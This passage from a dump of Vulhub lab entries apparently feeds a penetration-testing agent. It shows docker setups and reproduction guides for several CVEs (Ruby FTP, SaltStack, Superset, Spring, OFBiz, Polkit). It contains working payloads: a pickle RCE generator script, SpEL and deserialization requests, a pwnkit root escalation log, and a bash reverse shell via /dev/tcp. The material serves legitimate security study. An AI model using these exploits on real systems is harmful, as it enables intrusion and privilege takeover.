    "readme": "# Ruby Net::FTP Module Command Injection (CVE-2017-17405)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRuby Net::FTP module is a FTP library provided by Ruby core.\n\nRuby before 2.4.3 allows Net::FTP command injection. `Net::FTP#get`, `getbinaryfile`, `gettextfile`, `put`, `putbinaryfile`, and `puttextfile` use `Kernel#open` to open a local file. If the localfile argument starts with the \"|\" pipe character, the command following the pipe character is executed. The default value of localfile is `File.basename(remotefile)`, so malicious FTP servers could cause arbitrary command execution.\n\nReferences:\n\n- <https://blog.heroku.com/identifying-ruby-ftp-cve>\n- <https://www.exploit-db.com/exploits/43381>\n\n## Vulnerable environment\n\nExecute following command to start a Ruby 2.4.1 webserver that uses Net::FTP to download FTP file:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, a simple webserver is running on `http://your-ip:8080/`. What this server does is that when we visit `http://your-ip:8080/download?uri=ftp://example.com:2121/&file=vulhub.txt`, it downloads the file `vulhub.txt` from FTP server `example.com:2121`.\n\n## Exploit\n\nSince this is an FTP client vulnerability, we have to to run a simple FTP server that can be accessed. For example, using Python's pyftpdlib:\n\n```\n# intsall pyftpdlib\npip install pyftpdlib\n\n# start a FTP server on `0.0.0.0:2121`\npython3 -m pyftpdlib -p 2121 -i 0.0.0.0\n```\n\nThen, use this FTP server address as the *uri* parameter and the payload `|touch${IFS}success.txt` as the *file* parameter in following request:\n\n```\nGET /download?uri=ftp://example.com:2121/&file=|touch${IFS}success.txt HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36\nConnection: close\nCache-Control: max-age=0\n\n\n```\n\n![](1.png)\n\nGo into the docker container, you can see the `success.txt` has been created successfully:\n\n![](2.png)\n\nChange the payload to `|bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA...}|{base64,-d}|{bash,-i}'` and get a reverse shell:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2020-11652.md",
    "filenamenomd": "CVE-2020-11652",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-11652/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-11652/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 138 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n saltstack:\n   image: vulhub/saltstack:2019.2.3\n   ports:\n    - \"8000:8000\"\n    - \"4505:4505\"\n    - \"4506:4506\"\n    - \"2222:22\"\n\n```\n\n",
    "readme": "# SaltStack Arbitrary File Read and Write (CVE-2020-11652)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSaltStack is a Python-based client-server configuration management tool. A security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652).\n\nIn the CVE-2020-11652, attackers can read and write arbitrary files on the server by constructing malicious requests.\n\nReferences:\n\n- https://labs.f-secure.com/advisories/saltstack-authorization-bypass\n- [https://github.com/rossengeorgiev/salt-security-backports][1]\n- [https://github.com/jasperla/CVE-2020-11651-poc][2]\n\n## Environment Setup\n\nExecute the following command to start a SaltStack Master service 2019.2.3:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, the following ports will be listening:\n\n- 4505/4506: These are the ports for communication between SaltStack Master and minions\n- 8000: This is the Salt API port\n- 2222: This is the SSH server port inside the container\n\n## Vulnerability Reproduction\n\nThis document demonstrates the CVE-2020-11652 vulnerability, referring to the vulnerability author's explanation:\n\n> The wheel module contains commands used to read and write files under specific directory paths. The inputs to these functions are concatenated with the target directory and the resulting path is not canonicalized, leading to an escape of the intended path restriction.\n\nThe write method in wheel/file_roots.py uses `os.path.isabs` to check if the user input is an absolute path, possibly to prevent writing to other directories. However, attackers can actually use `../` to traverse to the root directory and write arbitrary files:\n\n```\nmsg = {\n    'key': root_key,\n    'cmd': 'wheel',\n    'fun': 'file_roots.write',\n    'path': '../../path/to/target',\n    'data': 'test'\n#    'saltenv': 'base',\n  }\n```\n\nReferring to [this project][1], we can write a simple POC to write to `/etc/cron.d/shell` and use crontab to execute arbitrary commands:\n\n![](1.png)\n\n`id > /tmp/success` was successfully executed.\n\nYou can also use this [POC][2] to reproduce the vulnerability.\n\n[1]: https://github.com/rossengeorgiev/salt-security-backports\n[2]: https://github.com/jasperla/CVE-2020-11651-poc\n"
  },
  {
    "filename": "CVE-2020-11651.md",
    "filenamenomd": "CVE-2020-11651",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-11651/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/saltstack/CVE-2020-11651/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 138 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n saltstack:\n   image: vulhub/saltstack:2019.2.3\n   ports:\n    - \"8000:8000\"\n    - \"4505:4505\"\n    - \"4506:4506\"\n    - \"2222:22\"\n\n```\n\n",
    "readme": "# SaltStack Information Disclosure Leads to Privilege Escalation (CVE-2020-11651)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSaltStack is a Python-based client-server configuration management tool. A security team disclosed that SaltStack has an authentication bypass vulnerability (CVE-2020-11651) and a directory traversal vulnerability (CVE-2020-11652).\n\nIn the CVE-2020-11651, attackers can bypass the Salt Master's validation logic by constructing malicious requests, call unauthorized function features, and consequently achieve remote command execution.\n\nReferences:\n\n- https://labs.f-secure.com/advisories/saltstack-authorization-bypass\n- https://github.com/rossengeorgiev/salt-security-backports\n- https://github.com/saltstack/salt/blob/a67d76b15615983d467ed81371b38b4a17e4f3b7/tests/integration/master/test_clear_funcs.py\n\n## Environment Setup\n\nExecute the following command to start a SaltStack Master service 2019.2.3:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, the following ports will be listening:\n\n- 4505/4506: These are the ports for communication between SaltStack Master and minions\n- 8000: This is the Salt API port\n- 2222: This is the SSH server port inside the container\n\n## Vulnerability Reproduction\n\nThis document demonstrates the reproduction of CVE-2020-11651 vulnerability.\n\nWe can use the following request to execute the `ClearFuncs._prep_auth_info()` method in `salt/master.py`:\n\n```\n{'cmd': '_prep_auth_info'}\n```\n\nUsing this method, we can obtain the keys of all users on the target. With these keys, we can execute backend functions with super administrator privileges, such as dispatching tasks.\n\nUsing [this POC](https://github.com/dozernz/cve-2020-11651), first obtain the Key, then execute `touch /tmp/success` on the master:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-14574.md",
    "filenamenomd": "CVE-2018-14574",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/app.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 112 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   build: .\n   ports:\n    - \"8000:8000\"\n   volumes:\n    - ./app.py:/usr/src/app.py\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/app.py\n\n- Extension: .py\n- Language: python\n- Size: 1073 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport os\nimport sys\nfrom django.urls import include, path, re_path\nfrom django.http import HttpResponse\n\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", __name__)\nBASE_DIR = os.path.dirname(os.path.abspath(__file__))\nDEBUG = False\nSECRET_KEY = 'vulhub'\n\nALLOWED_HOSTS = ['*']\nMIDDLEWARE = [\n    'django.middleware.common.CommonMiddleware',\n]\n\nROOT_URLCONF = __name__\nTEMPLATES = [{\n    'BACKEND': 'django.template.backends.django.DjangoTemplates',\n    'DIRS': [os.path.join(BASE_DIR, 'templates')]\n}]\nLOGGING = {\n    'version': 1,\n    'disable_existing_loggers': False,\n    'handlers': {\n        'console': {\n            'class': 'logging.StreamHandler',\n        },\n    },\n    'loggers': {\n        'django': {\n            'handlers': ['console'],\n            'level': os.getenv('DJANGO_LOG_LEVEL', 'WARNING'),\n        },\n    },\n}\n\n\ndef home(request, path=None):\n    return HttpResponse('Hello, world.')\n\n\nurlpatterns = [\n    path('', home),\n    re_path(r'^(.*)/$', home),\n]\n\nfrom django.core.management import execute_from_command_line\nexecute_from_command_line(sys.argv)\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/django/CVE-2018-14574/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 204 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM python:3.7-alpine\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN pip install -U pip \\\n    && pip install django==2.0.7\n\nWORKDIR /usr/src\n\nCMD [\"python\", \"app.py\", \"runserver\", \"0.0.0.0:8000\"]\n```\n\n",
    "readme": "# Django < 2.0.8 Open Redirect in CommonMiddleware (CVE-2018-14574)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDjango is a high-level Python web framework that encourages rapid development and clean, pragmatic design.\n\nDjango versions before 2.0.8 and 1.11.15 contain an open redirect vulnerability in CommonMiddleware when both `django.middleware.common.CommonMiddleware` and the `APPEND_SLASH` setting are enabled. If the project has a URL pattern that accepts any path ending in a slash, a maliciously crafted URL could lead to a redirect to an arbitrary external site, enabling phishing and other attacks.\n\nReferences:\n\n- <https://www.djangoproject.com/weblog/2018/aug/01/security-releases/>\n- <https://nvd.nist.gov/vuln/detail/CVE-2018-14574>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Django 2.0.7 server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, you can access the Django home page at `http://your-ip:8000`.\n\n## Vulnerability Reproduction\n\nVisit the following URL to trigger the open redirect vulnerability:\n\n```\nhttp://your-ip:8000//www.example.com\n```\n\nThe server will redirect you to `//www.example.com/`, which the browser interprets as an absolute URL, effectively redirecting to an external site:\n\n![](1.png)\n\nThis vulnerability can be exploited by attackers to redirect users to malicious websites, potentially leading to phishing attacks or other security issues.\n"
  },
  {
    "filename": "CVE-2023-37941.md",
    "filenamenomd": "CVE-2023-37941",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/superset/CVE-2023-37941/CVE-2023-37941.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/superset/CVE-2023-37941/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/superset/CVE-2023-37941/CVE-2023-37941.py\n\n- Extension: .py\n- Language: python\n- Size: 1833 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nCVE-2023-37941 exploit script for Apache Superset\nThis script creates a malicious pickle payload that when deserialized\nby Apache Superset will execute the specified command.\n\nUsage:\n    python CVE-2023-37941.py -c \"touch /tmp/success\" -d sqlite\n    \n    -c: Command to execute\n    -d: Database type (default: sqlite)\n\"\"\"\n\nimport pickle\nimport base64\nimport os\nimport argparse\nfrom binascii import hexlify\n\n\nclass PickleRCE:\n    def __reduce__(self):\n        # Reverse shell command\n        return os.system, (self.cmd,)\n    \n    def __init__(self, cmd):\n        self.cmd = cmd\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='Generate a malicious pickle payload for CVE-2023-37941')\n    parser.add_argument('-c', '--cmd', required=True, help='Command to execute')\n    parser.add_argument('-d', '--database', choices=['sqlite', 'mysql', 'postgres'], default='sqlite', help='Database type')\n    args = parser.parse_args()\n    \n    # Generate the malicious pickle payload\n    payload = pickle.dumps(PickleRCE(args.cmd), protocol=0)\n\n    # Print the payload in both base64 and hex formats\n    print(\"[+] Base64 encoded payload:\")\n    print(base64.b64encode(payload).decode())\n    \n    print(\"\\n[+] Hex encoded payload (for SQL): \")\n    if args.database == 'sqlite':\n        print(r'''update key_value set value=X'{data}' where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))\n    elif args.database == 'mysql':\n        print(r'''update key_value set value=UNHEX('{data}') where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))\n    elif args.database == 'postgres':\n        print(r'''update key_value set value='\\x{data}' where resource='dashboard_permalink';'''.format(data=hexlify(payload).decode()))\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/superset/CVE-2023-37941/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 79 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/superset:2.0.1\n    ports:\n      - 8088:8088\n\n```\n\n",
    "readme": "# Apache Superset Python Pickle Deserialization Leads to RCE (CVE-2023-37941)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Superset is an open-source data exploration and visualization platform designed to be visual, intuitive, and interactive.\n\nApache Superset versions from 1.5 to 2.1.0 contain a Python Pickle deserialization vulnerability (CVE-2023-37941). The application uses Python's `pickle` package to store certain configuration data in the metadata database. An authenticated user with write access to the metadata database can insert a malicious pickle payload, which when deserialized by the application, leads to remote code execution on the Superset server.\n\nWhen combined with [CVE-2023-27524](../CVE-2023-27524), an unauthenticated attacker can achieve remote code execution by first bypassing authentication and then exploiting the deserialization vulnerability.\n\nReferences:\n\n- <https://www.horizon3.ai/attack-research/disclosures/apache-superset-part-ii-rce-credential-harvesting-and-more/>\n- <https://github.com/Barroqueiro/CVE-2023-37941>\n- <https://forum.butian.net/share/2458>\n\n## Environment Setup\n\nExecute the following command to start an Apache Superset 2.0.1 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can access Superset at `http://your-ip:8088`. The default login credentials are admin/vulhub.\n\n## Vulnerability Reproduction\n\nThe following steps assume you have already generate a valid session cookie and logged into the Dashboard through the [CVE-2023-27524](../CVE-2023-27524) vulnerability.\n\nFirst, create a new \"Dashboard\" and generate a permalink by clicking the \"Share\" button, copy this permalink and we will use it later:\n\n![](1.png)\n\nThen, create a new \"Database\" connection by following the steps below:\n\n1. Navigate to \"Data\" → \"Databases\" in the Superset UI\n2. Click \"+ Database\" to add a new database connection\n3. Enter a name for the database (e.g., \"SQLite\")\n4. For the SQLAlchemy URI, use: `sqlite+pysqlite:////app/superset_home/superset.db`\n5. Expand \"Advanced\" and check \"Expose in SQL Lab\" and \"Allow DML\"\n6. Save the database configuration\n\n![](2.png)\n\n![](3.png)\n\nThen, use [CVE-2023-37941.py](CVE-2023-37941.py) to generate a malicious SQL command (the `-d` option can be `sqlite`, `mysql`, or `postgres`, means the database type of the Superset server, here is `sqlite` in Vulhub):\n\n```shell\n$ python3 CVE-2023-37941.py -c \"touch /tmp/success\" -d sqlite\n[+] Base64 encoded payload:\nY3Bvc2l4CnN5c3RlbQpwMAooVnRvdWNoIC90bXAvc3VjY2VzcwpwMQp0cDIKUnAzCi4=\n\n[+] Hex encoded payload (for SQL):\nupdate key_value set value=X'63706f7369780a73797374656d0a70300a2856746f756368202f746d702f737563636573730a70310a7470320a5270330a2e' where resource='dashboard_permalink';\n```\n\n> [!NOTE]\n> Because the `pickle` deserialization payload is different for different operating systems, you need to run the POC on Linux or MacOS.\n\nExecute the generated SQL command in the SQL Lab:\n\n![](4.png)\n\nFinally, trigger the deserialization by accessing the permalink:\n\n![](5.png)\n\nAs you can see, the `touch /tmp/success` command has been executed successfully.\n"
  },
  {
    "filename": "CVE-2022-22963.md",
    "filenamenomd": "CVE-2022-22963",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22963/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22963/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 92 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-cloud-function:3.2.2\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Spring Cloud Function SpEL Code Injection (CVE-2022-22963)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Cloud Function provides a common model for deploying function-based software on a variety of platforms, including FaaS (function as a service) platforms like Amazon AWS Lambda.\n\nReferences:\n\n- <https://tanzu.vmware.com/security/cve-2022-22963>\n- <https://mp.weixin.qq.com/s/onYJWIESgLaWS64lCgsKdw>\n- <https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f>\n\n## Vulnerability Environment\n\nExecute the following command to start a server that uses Spring Cloud Function 3.2.2:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, execute `curl http://your-ip:8080/uppercase -H \"Content-Type: text/plain\" --data-binary test` you can convert the user input to uppercase.\n\n## Vulnerability Reproduce\n\nThere is a SpEL expression injection in the request header `spring.cloud.function.routing-expression`.\n\nSend the following request to execute `touch /tmp/success` on the target server:\n\n```\nPOST /functionRouter HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")\nContent-Type: text/plain\nContent-Length: 4\n\ntest\n```\n\n![](1.png)\n\nAs you can see, `touch /tmp/success` has been executed successfully.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-9496.md",
    "filenamenomd": "CVE-2020-9496",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2020-9496/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2020-9496/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 93 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:17.12.01\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n```\n\n",
    "readme": "# Unsafe deserialization of XMLRPC arguments in ApacheOfBiz (CVE-2020-9496)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nOfBiz exposes an XMLRPC endpoint at `/webtools/control/xmlrpc`. This is an unauthenticated endpoint since authentication is applied on a per-service basis. However, the XMLRPC request is processed before authentication. As part of this processing, any serialized arguments for the remote invocation are deserialized, therefore if the classpath contains any classes that can be used as gadgets to achieve remote code execution, an attacker will be able to run arbitrary system commands on any OfBiz server with same privileges as the servlet container running OfBiz.\n\nReferences:\n\n1. https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz\n2. https://github.com/dwisiswant0/CVE-2020-9496\n3. https://www.cnblogs.com/ph4nt0mer/p/13576739.html\n\n## Vulnerable environment\n\nExecuting following command to start an Apache OfBiz (17.12.01):\n\n```\ndocker compose up -d\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\nThere is no error message in response by default, we can't reproduce the vulnerability using the POC of [reference link 2](https://github.com/dwisiswant0/CVE-2020-9496), so ask [ysoserial](https://github.com/frohoff/ysoserial) for help.\n\nGenerate the CommonsBeanutils1 payload:\n\n```\njava -jar ysoserial.jar CommonsBeanutils1 \"touch /tmp/success\" | base64 | tr -d \"\\n\"\n```\n\n![](1.png)\n\nReplace the `[base64-payload]` and send the request:\n\n```\nPOST /webtools/control/xmlrpc HTTP/1.1\nHost: your-ip\nContent-Type: application/xml\nContent-Length: 4093\n\n<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>ProjectDiscovery</methodName>\n  <params>\n    <param>\n      <value>\n        <struct>\n          <member>\n            <name>test</name>\n            <value>\n              <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">[base64-payload]</serializable>\n            </value>\n          </member>\n        </struct>\n      </value>\n    </param>\n  </params>\n</methodCall>\n```\n\n![](2.png)\n\n`touch /tmp/success` is succesful executing in the container:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2021-4034.md",
    "filenamenomd": "CVE-2021-4034",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/polkit/CVE-2021-4034/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/polkit/CVE-2021-4034/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n cmd:\n   image: vulhub/polkit:0.105\n   ports:\n     - 2222:2222\n\n```\n\n",
    "readme": "# Polkit's `pkexec` Local Privilege Escalation Vulnerability (CVE-2021-4034)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPolkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. The pkexec application is a setuid tool that provided by Polkit, it is designed to allow unprivileged users to run commands as privileged users according predefined policies.\n\nThe current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation giving unprivileged users administrative rights on the target machine.\n\nReferences:\n\n- https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\n- https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034\n- https://github.com/berdav/CVE-2021-4034\n\n## Vulnerability Environment\n\n> Note: Linux kernel is fixed the [`argc==0` bug](https://lwn.net/Articles/882799/) in this [commit](https://github.com/torvalds/linux/commit/dcd46d897adb70d63e025f175a00a89797d31a43), so Vulhub uses a Qemu virtual machine emulator to run a vulnerable Ubuntu 20.04, that contains polkit version 0.105. It required your system have at least 2G memory to run the environment.\n\nYou can run following command to start the Ubuntu 20.04 with polkit 0.105:\n\n```\ndocker compose up -d\n```\n\nBecause there is a virtual server running inside Docker container, you will need to wait longer until you see the success logs using `docker compose logs -f` like that:\n\n```\ncmd_1  | [  651.040963] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 running 'modules:final' at Wed, 11 Jan 2023 14:57:10 +0000. Up 209.05 seconds.\ncmd_1  | [  651.046024] cloud-init[1627]: ci-info: no authorized SSH keys fingerprints found for user ubuntu.\ncmd_1  | [  651.049934] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 finished at Wed, 11 Jan 2023 15:04:32 +0000. Datasource DataSourceNoCloud [seed=/dev/sdb][dsmode=net].  Up 650.90 seconds\ncmd_1  | [  OK  ] Finished Execute cloud user/final scripts.\ncmd_1  | [  OK  ] Reached target Cloud-init target.\n```\n\n![](1.png)\n\n## Exploit\n\nFirstly, use `ubuntu/vulhub` to login the target SSH server:\n\n```\nssh ubuntu@192.168.1.163 -p2222\n```\n\nUse [this repository](https://github.com/berdav/CVE-2021-4034) to reproduce the CVE-2021-4034:\n\n```\nubuntu@ubuntu:~$ id\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)\nubuntu@ubuntu:~$ cd /tmp/\nubuntu@ubuntu:/tmp$ wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz\n--2023-01-11 15:11:29--  https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz\nResolving github.com (github.com)... 20.205.243.166\nConnecting to github.com (github.com)|20.205.243.166|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLocation: https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main [following]\n--2023-01-11 15:11:30--  https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main\nResolving codeload.github.com (codeload.github.com)... 20.205.243.165\nConnecting to codeload.github.com (codeload.github.com)|20.205.243.165|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [application/x-gzip]\nSaving to: ‘main.tar.gz’\n\nmain.tar.gz                                            [ <=>                                                                                                             ]   4.08K  --.-KB/s    in 0.003s\n\n2023-01-11 15:11:30 (1.49 MB/s) - ‘main.tar.gz’ saved [4176]\n\nubuntu@ubuntu:/tmp$ tar -zxvf main.tar.gz\nCVE-2021-4034-main/\nCVE-2021-4034-main/.gitignore\nCVE-2021-4034-main/LICENSE\nCVE-2021-4034-main/Makefile\nCVE-2021-4034-main/README.md\nCVE-2021-4034-main/cve-2021-4034.c\nCVE-2021-4034-main/cve-2021-4034.sh\nCVE-2021-4034-main/dry-run/\nCVE-2021-4034-main/dry-run/Makefile\nCVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c\nCVE-2021-4034-main/dry-run/pwnkit-dry-run.c\nCVE-2021-4034-main/pwnkit.c\nubuntu@ubuntu:/tmp$ cd CVE-2021-4034-main/\nubuntu@ubuntu:/tmp/CVE-2021-4034-main$ make\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" > gconv-modules\nmkdir -p GCONV_PATH=.\ncp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.\nubuntu@ubuntu:/tmp/CVE-2021-4034-main$ ./cve-2021-4034\n# id\nuid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)\n```\n\n![](2.png)\n\nAs you can see, I currently become a root user after exploits.\n"
  },
  {
    "filename": "CVE-2017-4971.md",
    "filenamenomd": "CVE-2017-4971",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2017-4971/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2017-4971/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 85 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-webflow:2.4.4\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Spring WebFlow Remote Code Execution (CVE-2017-4971)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring WebFlow is a framework suitable for developing flow-based applications (such as shopping logic), which can separate the flow definition from the classes and views that implement the flow behavior. In its 2.4.x versions, if we can control the field during data binding, it will lead to a SpEL expression injection vulnerability, ultimately resulting in arbitrary command execution.\n\nReference links:\n\n- https://threathunter.org/topic/593d562353ab369c55425a90\n- https://pivotal.io/security/cve-2017-4971\n\n## Environment Setup\n\nExecute the following command to start the a web application based on Spring WebFlow 2.4.4:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` to see a hotel booking page, which is a simple example provided by Spring WebFlow.\n\n## Vulnerability Reproduce\n\nFirst, visit `http://your-ip:8080/login` and log in to the system using any of the accounts/passwords given on the left side of the page:\n\n![](1.png)\n\nThen visit the hotel with id 1 at `http://your-ip:8080/hotels/1`, click the \"Book Hotel\" button, fill in the relevant information, and click \"Process\" (from this step, WebFlow officially begins):\n\n![](2.png)\n\nThen click \"Confirm\":\n\n![](3.png)\n\nAt this point, intercept the request and capture a POST data packet. We add a field to it (which is the reverse shell POC):\n\n```\n_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash -i >& /dev/tcp/10.0.0.1/21 0>&1\")).start()=vulhub\n```\n\n![](4.png)\n\n(Note: Don't forget to URL encode)\n\nSuccessfully executed, gaining shell access:\n\n![](5.png)\n"
  },
  {
    "filename": "CVE-2018-15685.md",
    "filenamenomd": "CVE-2018-15685",
